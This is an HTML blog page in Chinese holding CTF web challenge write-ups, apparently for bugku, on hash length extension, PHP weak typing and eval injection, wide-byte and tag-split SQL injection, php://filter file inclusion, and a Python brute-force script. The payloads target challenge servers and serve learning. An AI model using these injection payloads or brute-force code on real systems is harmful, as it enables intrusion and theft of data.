<h2 id="0x12-Collide"><a href="#0x12-Collide" class="headerlink" title="0x12 Collide"></a>0x12 Collide</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>哈希长度扩展攻击</p>
<p>hash的MD5对数据进行加密的时候，是分组进行加密。<br><br>MD5加密的时候会有四个初始向量IV，对第一组数据加密的时候利用的就是四个初始向量，不同的是，在对第二组数据进行加密的时候，使用的并不是四个初始向量，而是将前一组加密后的密文作为下一组的初始向量。<br><br>哈希长度扩展攻击便是利用这个特性来实现的。</p>
<h3 id="扩展攻击实现的条件"><a href="#扩展攻击实现的条件" class="headerlink" title="扩展攻击实现的条件"></a>扩展攻击实现的条件</h3><ul>
<li>已知MD5($salt.$data)值，</li>
<li>知道加密的$salt的长度</li>
<li>知道$data的值<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>从源码我们可以获得以下内容</p>
<ul>
<li>enc(“guest”)的值为78cfc57d983b4a17e55828c001a3e781</li>
<li>$key的长度为46</li>
</ul>
<p>题目的关键代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这段代码要求我们输入的username在经过enc函数加密之后，与$_COOKIE[‘verify’]的值相等，并且username中必须含有admin。</p>
<p>看到这里，我们就可以想到来利用哈希长度扩展来帮我们解决这个问题。</p>
<p>而且题目给予我们的信息，刚好满足哈希长度扩展攻击的要求。</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>这里我们使用HashPump这个工具</p>
<p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
<p>使用说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 已知的hash值，这里是$_COOKIE[&apos;verify&apos;]的值</span><br><span class="line">Input Data: 上面的hash值解密后的字符串，这里是guest。</span><br><span class="line">Input Key Length: $key的长度</span><br><span class="line">Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。</span><br></pre></td></tr></table></figure></p>
<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  HashPump hashpump</span><br><span class="line">Input Signature: 78cfc57d983b4a17e55828c001a3e781</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 46</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">5f585093a7fe86971766c3d25c43d0eb</span><br><span class="line">guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure></p>
<p>然后我们将得到的hash值去替换数据包中$_COOKIE[‘verify’]的值，然后post提交username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。</p>
<h2 id="0x13-Only-admin-can-see-flag"><a href="#0x13-Only-admin-can-see-flag" class="headerlink" title="0x13 Only admin can see flag"></a>0x13 Only admin can see flag</h2><h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p><a href="https://ntwyc2018.github.io/2018/05/12/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/05/12/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a><br>我博客上有</p>
<h2 id="0x14-php是世界上最好的语言"><a href="#0x14-php是世界上最好的语言" class="headerlink" title="0x14 php是世界上最好的语言"></a>0x14 php是世界上最好的语言</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/V%28FIH2OZNY_G%289Q%29Q4O4K%5B7.png" alt="image"></p>
<p>题目代码为如下</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/TDOJLKYE%7BGWF23NQ%25%5DR1X84.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我在hackbar post 数组绕过以及0e绕过，都不行，只会输出 xxxxx <br><br>最后我直接在输入框输入 ，结果进入下一关了，不知道是啥原因= =？</p>
<p><a href="https://ntwyc2018.github.io/2018/02/25/phpruoleixing/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/02/25/phpruoleixing/</a></p>
<p>第二关代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>明显的可变变量漏洞，构造?a=flag即可</p>
<h2 id="0x15-Sqli"><a href="#0x15-Sqli" class="headerlink" title="0x15 Sqli"></a>0x15 Sqli</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/RF4Y7FL%25G4V%608H%603%28QV%5DG5O.png" alt="image"></p>
<p>在我博客里<a href="https://ntwyc2018.github.io/2018/05/20/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84SQL/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/05/20/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84SQL/</a></p>
<h2 id="0x16-为什么这么简单啊"><a href="#0x16-为什么这么简单啊" class="headerlink" title="0x16 为什么这么简单啊"></a>0x16 为什么这么简单啊</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/JM0%5B%60W~ADI~WEV9MJ~%7DF8%5D4.png" alt="image"></p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/5BJFEKX758%5BAT3%7DVG1ZYJZ7.png" alt="image"></p>
<p>第一关比较简单,构造两个请求头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://edu.xss.tv</span><br><span class="line">X-Forwarded-For: 110.110.110.110</span><br></pre></td></tr></table></figure></p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5DQNX7Z%7BL@303G_HRS_%5B%5B%7B8S.png" alt="image"></p>
<p>第二关比较简单，查看源代码有个password的js，里面有一段base64，解码后输入密码得到flag</p>
<h2 id="0x17"><a href="#0x17" class="headerlink" title="0x17"></a>0x17</h2>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-bugkuCTF web" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/bugkuCTF web/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/bugkuCTF web/">bugkuCTF Web</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="0x01-web2"><a href="#0x01-web2" class="headerlink" title="0x01 web2"></a>0x01 web2</h3><p>点开后是一张动图，查看源代码发现flag</p>
<h3 id="0x02-文件上传测试"><a href="#0x02-文件上传测试" class="headerlink" title="0x02 文件上传测试"></a>0x02 文件上传测试</h3><p>上传一张jpg格式的图片抓包后后缀改为php即可</p>
<h3 id="0x03-计算器"><a href="#0x03-计算器" class="headerlink" title="0x03 计算器"></a>0x03 计算器</h3><p>下面给出三种方法</p>
<ul>
<li>F12修改源代码长度为3</li>
<li>火狐hackbar port输入答案</li>
<li>burpsuite抓包修改长度答案<h3 id="0x04-web基础-GET"><a href="#0x04-web基础-GET" class="headerlink" title="0x04 web基础$_GET"></a>0x04 web基础$_GET</h3>url增加如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?what=flag</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x05-web基础-POST"><a href="#0x05-web基础-POST" class="headerlink" title="0x05 web基础$_POST"></a>0x05 web基础$_POST</h3><p>因为是post，无法直接url上，利用火狐hackbar post过去</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/DJZOH71I2GPD2JJXIR%28J@77.png" alt="image"></p>
<h3 id="0x06-矛盾"><a href="#0x06-矛盾" class="headerlink" title="0x06 矛盾"></a>0x06 矛盾</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line"> if(!is_numeric($num))</span><br><span class="line"> &#123;</span><br><span class="line"> echo $num;</span><br><span class="line"> if($num==1)</span><br><span class="line"> echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理:php弱类型的绕过</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造?num=1a即可</span><br></pre></td></tr></table></figure>
<h3 id="0x07-web3"><a href="#0x07-web3" class="headerlink" title="0x07 web3"></a>0x07 web3</h3><p>点开题目链接弹出对话框没完了，直接禁止再弹出对话框，查看源代码发现如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</span><br></pre></td></tr></table></figure></p>
<p>可知这是一串html码，在线url解码得到如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;J2sa42ahJK-HS11III&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x08-sql注入"><a href="#0x08-sql注入" class="headerlink" title="0x08 sql注入"></a>0x08 sql注入</h3><ul>
<li>查看源代码发现gb2312，猜想是宽字节注入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df%27</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>报错，证明是宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
<p>爆出库sql5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure>
<p>结合题目爆出key</p>
<h3 id="0x09-域名解析"><a href="#0x09-域名解析" class="headerlink" title="0x09 域名解析"></a>0x09 域名解析</h3><p>题目说把flag.bugku.com解析到120.24.86.145能拿到flag，那就改一下本地的host</p>
<p>打开/etc/hosts，修改里面的内容,增加一条内容，内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">120.24.86.145    flag.bugku.com</span><br></pre></td></tr></table></figure></p>
<p>保存之后，再在浏览器里打开flag.bugku.com就能看到flag。</p>
<h3 id="0x10-SQL注入1"><a href="#0x10-SQL注入1" class="headerlink" title="0x10 SQL注入1"></a>0x10 SQL注入1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">	if (substr_count($id, $value) &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br></pre></td></tr></table></figure>
<p>备注:strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<p>所以可以利用这个标签来绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=0 uni&lt;b&gt;on sele&lt;b&gt;ct 1,database()#</span><br></pre></td></tr></table></figure></p>
<p>爆出数据库sql3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=0 uni&lt;b&gt;on sele&lt;b&gt;ct 1,hash fr&lt;b&gt;om sql3.key#</span><br></pre></td></tr></table></figure>
<p>爆出flag</p>
<h3 id="0x11-你必须让他停下"><a href="#0x11-你必须让他停下" class="headerlink" title="0x11 你必须让他停下"></a>0x11 你必须让他停下</h3><p>点开后连续不断的刷新网址，用burpsuite抓包发到intruder,随便构造没用的参数发送，根据length观察<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/L0T%25U3FFEW9X%7D5X%5BHGI~B@9.png" alt="image"></p>
<h3 id="0x12-本地包含"><a href="#0x12-本地包含" class="headerlink" title="0x12 本地包含"></a>0x12 本地包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;2333，不只是本地文件包含哦~&apos;; &lt;?php </span><br><span class="line">    include &quot;waf.php&quot;; </span><br><span class="line">    include &quot;flag.php&quot;; </span><br><span class="line">    $a = @$_REQUEST[&apos;hello&apos;]; </span><br><span class="line">    eval( &quot;var_dump($a);&quot;); </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>@$_REQUEST 的意思是获得参数，不论是@$_GET还是@$_POST可以得到的参数@$_REQUEST都能得到。<br>所以构造hello的get参数。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval函数将输入的字符串参数当作PHP程序代码来执行</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>原理:eval命令执行漏洞,把字符串构造成代码，要符合php语法</p>
<p>看了别人的wp，有很多种方法如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt; hello=);print_r(file(&quot;flag.php&quot;)</span><br><span class="line">&lt;2&gt; hello=);var_dump(file(&quot;flag.php&quot;)</span><br><span class="line">&lt;3&gt; hello=file(&quot;flag.php&quot;)</span><br><span class="line">&lt;4&gt; hello=);include(@$_POST[&apos;b&apos;]</span><br><span class="line">    在POST区域：b=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">&lt;5&gt; hello=);include(&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><br></pre></td></tr></table></figure></p>
<p>总结几个要点</p>
<ul>
<li>eval() 函数会把字符串参数当做代码来执行。</li>
<li>file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回。</li>
<li>print_r() 函数只用于输出数组。</li>
<li>var_dump() 函数可以输出任何内容：输出变量的容，类型或字符串的内容，类型，长度。</li>
<li>hello=file(“flag.php”)，最终会得到var_dump(file(“flag.php”))，以数组形式输出文件内容。</li>
<li>include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果。 <h3 id="0x13-变量1"><a href="#0x13-变量1" class="headerlink" title="0x13 变量1"></a>0x13 变量1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&apos;args&apos;]))&#123;</span><br><span class="line">    $args = $_GET[&apos;args&apos;];</span><br><span class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;var_dump($$args);&quot;);</span><br></pre></td></tr></table></figure>
<ul>
<li>原理:$$为可变变量</li>
<li>超全局数组 GLOBALS（一个包含了全部变量的全局组合数组。变量的名字就是数组的键），传进去之后就会将代码中所有的全局变量打印出来。</li>
<li>?args=GLOBALS<h3 id="0X14-web5"><a href="#0X14-web5" class="headerlink" title="0X14 web5"></a>0X14 web5</h3>查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;BKCTF-WEB4&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=&quot;display:none;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;post&quot; &gt;</span><br><span class="line">看看源代码？&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var p1 = &apos;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&apos;;</span><br><span class="line">var p2 = &apos;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&apos;;</span><br><span class="line">eval(unescape(p1) + unescape(&apos;%35%34%61%61%32&apos; + p2));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;input&quot; name=&quot;flag&quot; id=&quot;flag&quot; /&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape采用ISO Latin字符集对指定的字符串进行编码。所有的空格符、标点符号、特殊字符以及其他非ASCII字符都将被转化成%xx格式的字符编码(xx等于该字符在字符集表里面的编码的16进制数字)。</span><br></pre></td></tr></table></figure>
<p>按照要求进行unescape解密得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure></p>
<p>得到密码:67d709b2b54aa2aa648cf6e87a7114f1,在页面输入得到flag</p>
<h3 id="0x15-flag在index里"><a href="#0x15-flag在index里" class="headerlink" title="0x15 flag在index里"></a>0x15 flag在index里</h3><p>点开后发现url为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=show.php</span><br></pre></td></tr></table></figure></p>
<p>容易想到文件包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>得到一串base64码，解码后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125;</span><br><span class="line">	$file=$_GET[&apos;file&apos;];</span><br><span class="line">	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x16-输入密码查看flag"><a href="#0x16-输入密码查看flag" class="headerlink" title="0x16 输入密码查看flag"></a>0x16 输入密码查看flag</h3><p>很简单的一道题，burpsuite爆破五位纯数字<br>也可以用脚本爆破密码(下面是借鉴一位朋友的脚本)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def url(pwd):</span><br><span class="line">    url = &apos;http://120.24.86.145:8002/baopo/?yes&apos;</span><br><span class="line">    header = &#123;</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Xlcteam Browser&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;&apos;pwd&apos;:pwd&#125;</span><br><span class="line">    r = requests.post(url,headers=header,data=data)</span><br><span class="line">    return len(r.content.decode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1=&apos;1234567890&apos;</span><br><span class="line">str2 = itertools.product(str1,repeat=5)</span><br><span class="line"></span><br><span class="line">for x in str2:</span><br><span class="line">    pwd = &apos;&apos;.join(x)</span><br><span class="line">    if url(pwd)!=1140:</span><br><span class="line">        print pwd</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
<h3 id="0x17-点击一百万次"><a href="#0x17-点击一百万次" class="headerlink" title="0x17 点击一百万次"></a>0x17 点击一百万次</h3><p>根据源代码得到关键clicks，直接上火狐hackbar post:clicks=1000000<br><img src="http://p1vrkwaxt.bkt.clouddn.com/Z7M%5BW@HK$N~K3G8TDP%29A%7DFX.png" alt="image"></p>
